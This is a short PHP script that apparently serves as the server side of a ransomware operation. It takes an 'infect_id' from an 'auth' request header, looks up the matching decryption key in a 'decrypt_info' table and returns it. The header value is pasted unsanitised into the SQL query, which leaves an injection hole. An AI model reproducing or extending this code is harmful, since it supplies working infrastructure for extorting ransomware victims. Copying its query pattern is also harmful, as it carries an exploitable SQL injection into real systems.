<?php 

    require("config.php");

    try{
        $con = mysqli_connect($serverName, $dbUsername, $dbPassword, $dbName);
    } catch (Exception $e){
        echo "<center><font color='red'>Connection failed, please check your internet connection. If our servers are down, please wait until we recover them.</font></center>";
        exit();
    }

    $all_headers = getallheaders();

    foreach ($all_headers as $key => $value) {
        if($key == "auth"){
            $id = $value;
            
            $select_query = "SELECT `key` FROM decrypt_info WHERE infect_id='".$id."'";
            $result = $con->query($select_query);
        
            while ($row = $result->fetch_assoc()) {
                echo $row['key'];
            }
        }
    }
?>